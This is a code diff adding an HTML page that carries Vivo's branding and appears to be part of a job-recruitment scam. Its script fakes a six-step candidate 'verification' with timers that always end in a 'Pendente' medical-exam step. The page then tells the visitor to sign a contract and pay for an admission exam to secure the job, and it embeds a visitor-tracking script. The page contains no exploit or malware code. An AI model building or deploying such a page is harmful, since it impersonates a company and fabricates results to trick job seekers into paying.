@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verificação de Candidato – Vivo</title>
+  <!-- Tailwind CSS via CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-50 text-gray-900">
+  <!-- Header Vivo -->
+  <header class="bg-white border-b border-gray-200">
+    <div class="max-w-5xl mx-auto flex items-center justify-between px-6 py-4">
+      <img src="images/vivo.png" alt="Vivo" class="h-8"/>
+      <nav class="space-x-6">
+        <a href="" class="text-gray-600 hover:text-gray-900 font-medium">Home</a>
+        <a href="" class="text-gray-600 hover:text-gray-900 font-medium">Sobre</a>
+        <a href="" class="text-gray-600 hover:text-gray-900 font-medium">Planos</a>
+      
+      </nav>
+    </div>
+  </header>
+
+  <main class="max-w-3xl mx-auto p- space-y-">
+    <head>
+  <!-- Tailwind CSS via CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    @keyframes waitDots {
+      0%, 20%   { content: ''; }
+      40%       { content: '.'; }
+      60%       { content: '..'; }
+      80%,100%  { content: '...'; }
+    }
+    /* Animação de pontos */
+    #wait-dots::after {
+      content: '';
+      display: inline-block;
+      animation: waitDots 1s steps(4,end) 10;
+    }
+  </style>
+
+  <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "rqs6jaszdp");
+</script>
+</head>
+<body class="bg-gray-50 text-gray-900">
+  <!-- Seu container principal -->
+  <div class="max-w-3xl mx-auto p-8 text-center">
+    <!-- Título existente -->
+    <h1 class="text-4xl font-bold text-gray-900">Analisando Perfil do Candidato</h1>
+    <p class="text-gray-600 mt-2">
+      Verificando compatibilidade com 
+      <span class="text-violet-600 font-semibold">Desenvolvedor Frontend Sênior</span>
+    </p>
+
+    <!-- Novo texto de aguarde -->
+    <div class="mt-6">
+      <p class="text-gray-700">
+        Aguarde, isso pode levar até <span class="font-semibold">15 segundos</span>
+        <span id="wait-dots" class="text-violet-600"></span>
+      </p>
+    </div>
+  </div>
+</body>
+
+   <!-- Cards de etapas -->
+<div id="steps" class="space-y-4">
+
+  <!-- 1 -->
+  <div data-step="1" class="step flex items-start p-5 bg-white shadow rounded-lg">
+    <div class="icon p-3 bg-violet-50 rounded-full animate-spin">
+      <!-- spinner -->
+      <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-violet-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+          d="M12 4v4m0 8v4m8-8h-4M4 12H0m15.364-6.364l-2.828 2.828M6.464 17.536l-2.828 2.828M17.536 17.536l2.828 2.828M6.464 6.464l2.828 2.828"/>
+      </svg>
+    </div>
+    <div class="ml-4 flex-1">
+      <div class="flex justify-between items-center">
+        <h2 class="title text-lg font-semibold text-gray-800">Análise de Currículo</h2>
+        <span class="status text-gray-500 font-medium flex items-center">Analyzing…</span>
+      </div>
+      <p class="text-gray-500 mt-1 text-sm">
+        Escaneando qualificações e experiências relevantes.
+      </p>
+      <div class="mt-3">
+        <div class="w-full bg-gray-200 rounded-full h-2 overflow-hidden">
+          <div class="progress h-2 bg-violet-600 rounded-full w-1/4 transition-all duration-500"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 2 -->
+  <div data-step="2" class="step flex items-start p-5 bg-white shadow rounded-lg">
+    <div class="icon p-3 bg-violet-50 rounded-full animate-spin">
+      <!-- spinner -->
+      <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-violet-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+          d="M12 4v4m0 8v4m8-8h-4M4 12H0m15.364-6.364l-2.828 2.828M6.464 17.536l-2.828 2.828M17.536 17.536l2.828 2.828M6.464 6.464l2.828 2.828"/>
+      </svg>
+    </div>
+    <div class="ml-4 flex-1">
+      <div class="flex justify-between items-center">
+        <h2 class="title text-lg font-semibold text-gray-800">Verificação de Habilidades</h2>
+        <span class="status text-gray-500 font-medium flex items-center">Analyzing…</span>
+      </div>
+      <p class="text-gray-500 mt-1 text-sm">
+        Aplicamos pequenos desafios práticos e simulamos tarefas do dia a dia para avaliar sua proficiência.
+      </p>
+      <div class="mt-3">
+        <div class="w-full bg-gray-200 rounded-full h-2 overflow-hidden">
+          <div class="progress h-2 bg-violet-600 rounded-full w-1/4 transition-all duration-500"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 3 -->
+  <div data-step="3" class="step flex items-start p-5 bg-white shadow rounded-lg">
+    <div class="icon p-3 bg-violet-50 rounded-full animate-spin">
+      <!-- spinner -->
+      <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-violet-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+          d="M12 4v4m0 8v4m8-8h-4M4 12H0m15.364-6.364l-2.828 2.828M6.464 17.536l-2.828 2.828M17.536 17.536l2.828 2.828M6.464 6.464l2.828 2.828"/>
+      </svg>
+    </div>
+    <div class="ml-4 flex-1">
+      <div class="flex justify-between items-center">
+        <h2 class="title text-lg font-semibold text-gray-800">Verificação de Documentação</h2>
+        <span class="status text-gray-500 font-medium flex items-center">Analyzing…</span>
+      </div>
+      <p class="text-gray-500 mt-1 text-sm">
+        Validando autenticidade de certificados e portfólios conforme políticas internas.
+      </p>
+      <div class="mt-3">
+        <div class="w-full bg-gray-200 rounded-full h-2 overflow-hidden">
+          <div class="progress h-2 bg-violet-600 rounded-full w-1/4 transition-all duration-500"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 4 -->
+  <div data-step="4" class="step flex items-start p-5 bg-white shadow rounded-lg">
+    <div class="icon p-3 bg-violet-50 rounded-full animate-spin">
+      <!-- spinner -->
+      <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-violet-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+          d="M12 4v4m0 8v4m8-8h-4M4 12H0m15.364-6.364l-2.828 2.828M6.464 17.536l-2.828 2.828M17.536 17.536l2.828 2.828M6.464 6.464l2.828 2.828"/>
+      </svg>
+    </div>
+    <div class="ml-4 flex-1">
+      <div class="flex justify-between items-center">
+        <h2 class="title text-lg font-semibold text-gray-800">Verificação de Antecedentes</h2>
+        <span class="status text-gray-500 font-medium flex items-center">Analyzing…</span>
+      </div>
+      <p class="text-gray-500 mt-1 text-sm">
+        Checamos bases públicas e cadastros oficiais para confirmar histórico profissional.
+      </p>
+      <div class="mt-3">
+        <div class="w-full bg-gray-200 rounded-full h-2 overflow-hidden">
+          <div class="progress h-2 bg-violet-600 rounded-full w-1/4 transition-all duration-500"></div>
+        </div>
+      </div>
+    </div>
+  
+  </div>
+
+  <!-- 5 -->
+<div data-step="5" class="step flex items-start p-5 bg-white shadow rounded-lg">
+  <div class="icon p-3 bg-violet-50 rounded-full animate-spin">
+    <!-- spinner -->
+    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-violet-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+        d="M12 4v4m0 8v4m8-8h-4M4 12H0m15.364-6.364l-2.828 2.828M6.464 17.536l-2.828 2.828M17.536 17.536l2.828 2.828M6.464 6.464l2.828 2.828"/>
+    </svg>
+  </div>
+  <div class="ml-4 flex-1">
+    <div class="flex justify-between items-center">
+      <h2 class="title text-lg font-semibold text-gray-800">Análise de Perfil Comportamental</h2>
+      <span class="status text-gray-500 font-medium flex items-center">Analyzing…</span>
+    </div>
+    <p class="text-gray-500 mt-1 text-sm">
+      Mapeamos seu estilo de trabalho e fit cultural por meio de questionário rápido.
+    </p>
+    <div class="mt-3">
+      <div class="w-full bg-gray-200 rounded-full h-2 overflow-hidden">
+        <div class="progress h-2 bg-violet-600 rounded-full w-1/4 transition-all duration-500"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Step 6: Análise de Perfil Comportamental (Pendente) -->
+<div data-step="6" class="step flex items-start p-5 bg-white shadow rounded-lg mt-6">
+  <div class="icon p-3 bg-violet-50 rounded-full animate-spin">
+    <!-- spinner -->
+    <svg xmlns="http://www.w3.org/2000/svg"
+         class="h-6 w-6 text-violet-600"
+         fill="none" viewBox="0 0 24 24" stroke="currentColor">
+      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+            d="M12 4v4m0 8v4m8-8h-4M4 12H0m15.364-6.364l-2.828 2.828M6.464 17.536l-2.828 2.828M17.536 17.536l2.828 2.828M6.464 6.464l2.828 2.828"/>
+    </svg>
+  </div>
+  <div class="ml-4 flex-1">
+    <div class="flex justify-between items-center">
+      <h2 class="title text-lg font-semibold text-gray-800">Verificação de Exame Adimissional</h2>
+      <span class="status text-gray-500 font-medium flex items-center">Analyzing…</span>
+    </div>
+    <p class="text-gray-500 mt-1 text-sm">
+            Realizamos seu exame admissional completo, incluindo avaliação clínica, exames laboratoriais e testes de aptidão física.
+
+    </p>
+    <div class="mt-3">
+      <div class="w-full bg-gray-200 rounded-full h-2 overflow-hidden">
+        <!-- barra começa roxa e largura zero -->
+        <div class="progress h-2 bg-violet-600 rounded-full w-1/4 transition-all duration-500"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+<div id="result-section" class="hidden">
+  <section class="bg-white p-10 rounded-2xl shadow-lg border-l-4 mx-auto max-w-2xl text-center">
+  
+  
+  <h2 class="inline-flex items-center justify-center text-3xl font-semibold text-gray-800 mb-4 tracking-tight">
+    <!-- Ícone de sucesso -->
+    <h2 class="inline-flex items-center justify-center text-3xl font-semibold text-gray-800 mb-4 tracking-tight">
+  <!-- Ícone de pendente -->
+  <!-- Defina a animação shake -->
+<style>
+  @keyframes shake {
+    0% { transform: translate(0, 0) rotate(0deg); }
+    25% { transform: translate(0px, -0px) rotate(-30deg); }
+    50% { transform: translate(-0px, 0px) rotate(30deg); }
+    75% { transform: translate(0px, 0px) rotate(0deg); }
+    100% { transform: translate(0, 0) rotate(-1deg); }
+  }
+  .shake {
+    animation: shake 0.8s infinite;
+  }
+</style>
+
+<!-- SVG com efeito de tremor -->
+ 
+<svg xmlns="http://www.w3.org/2000/svg"
+     class="h-7 w-7 text-yellow-500 mr-3 shake"
+     fill="currentColor" viewBox="0 0 20 20">
+  <path fill-rule="evenodd"
+        d="M6 2a1 1 0 00-1 1v2a3 3 0 002.094 2.828 1 1 0 01.656.944v.456a1 1 0 01-.656.944A3 3 0 005 13v2a1 1 0 001 1h8a1 1 0 001-1v-2a3 3 0 00-2.094-2.828 1 1 0 01-.656-.944v-.456a1 1 0 01.656-.944A3 3 0 0015 5V3a1 1 0 00-1-1H6zm1 3a1 1 0 011-1h4a1 1 0 011 1v.382a1 1 0 01-.293.707l-.207.207A1 1 0 0011 7.618V8a1 1 0 01-.447.894l-.105.053L9 9.618l-.448-.335A1 1 0 018 8.382V8a1 1 0 01-.293-.707V5z"
+        clip-rule="evenodd"/>
+</svg>
+
+    <path fill-rule="evenodd"
+          d="M6 2a1 1 0 00-1 1v2a3 3 0 002.094 2.828 1 1 0 01.656.944v.456a1 1 0 01-.656.944A3 3 0 005 13v2a1 1 0 001 1h8a1 1 0 001-1v-2a3 3 0 00-2.094-2.828 1 1 0 01-.656-.944v-.456a1 1 0 01.656-.944A3 3 0 0015 5V3a1 1 0 00-1-1H6zm1 3a1 1 0 011-1h4a1 1 0 011 1v.382a1 1 0 01-.293.707l-.207.207A1 1 0 0011 7.618V8a1 1 0 01-.447.894l-.105.053L9 9.618l-.448-.335A1 1 0 018 8.382V8a1 1 0 01-.293-.707V5z"
+          clip-rule="evenodd"/>
+  </svg>
+  Resultado da Análise
+</h2>
+
+      <span class="ml-4 inline-block bg-yellow-100 text-yellow-800 font-medium px-3 py-1 rounded-full text-sm">
+        Pendências a resolver
+      </span>
+    </h2>
+
+<p class="text-gray-600 mb-6 leading-relaxed">
+  Atenção: identificamos algumas pendências em seu cadastro. Mesmo assim, você pode avançar para a assinatura eletrônica do contrato em seguida, pagar a consulta admissional, para segurança de sua vaga e confirmação de contratação
+</p>
+
+
+  <a 
+    onclick="window.location.href='../assinatura/assinatura.html';"
+    class="inline-flex items-center justify-center bg-gradient-to-r from-violet-600 to-indigo-600 text-white font-semibold px-8 py-3 rounded-full shadow-md hover:from-violet-700 hover:to-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500 transition transform hover:-translate-y-0.5 mx-auto"
+  >
+    Assinar Contrato
+    <svg xmlns="http://www.w3.org/2000/svg" class="ml-3 h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7l5 5m0 0l-5 5m5-5H6"/>
+    </svg>
+  </a>
+</section>
+
+<script>
+  window.addEventListener('load', () => {
+    const steps  = document.querySelectorAll('.step');
+    const delays = { 2:2000, 3:5000, 4:9000, 5:14000, 6:18000 };
+
+    steps.forEach(card => {
+      const step     = +card.dataset.step;
+      const icon     = card.querySelector('.icon');
+      const status   = card.querySelector('.status');
+      const progress = card.querySelector('.progress');
+
+      setTimeout(() => {
+        icon.classList.remove('animate-spin');
+
+        if (step === 6) {
+          // Exame Admissional: preencher igual aos outros, mas cor amarela e status "Pendente"
+          icon.innerHTML = `
+            <svg xmlns="http://www.w3.org/2000/svg"
+                 class="h-6 w-6 text-yellow-600"
+                 fill="none" viewBox="0 0 24 24" stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                    d="M12 8v4m0 4h.01M4.93 4.93a10 10 0 1014.14 14.14A10 10 0 004.93 4.93z"/>
+            </svg>`;
+          status.textContent = 'Pendente';
+          status.classList.replace('text-gray-500','text-yellow-600');
+
+          // preenche a barra com transição do Tailwind e deixa amarela
+          progress.style.width = '100%';
+          progress.classList.replace('bg-violet-600','bg-yellow-500');
+          document.getElementById('result-section').classList.remove('hidden');
+        } else {
+          // passos 1–5 seguem o padrão "Concluído"
+          icon.innerHTML = `
+            <svg xmlns="http://www.w3.org/2000/svg"
+                 class="h-6 w-6 text-green-600"
+                 fill="currentColor" viewBox="0 0 20 20">
+              <path fill-rule="evenodd"
+                    d="M16.707 5.293a1 1 0 00-1.414-1.414L9 10.172l-2.293-2.293a1 
+                       1 0 00-1.414 1.414l3 3a1 1 0 001.414 0l7-7z"
+                    clip-rule="evenodd"/>
+            </svg>`;
+          status.textContent = 'Concluído';
+          status.classList.replace('text-gray-500','text-green-600');
+          progress.style.width = '100%';
+          progress.classList.replace('bg-violet-600','bg-green-600');
+        }
+      }, delays[step]);
+    });
+  });
+</script>
+
+
+
+
+
+
+
+
+</body>
+</html>
+
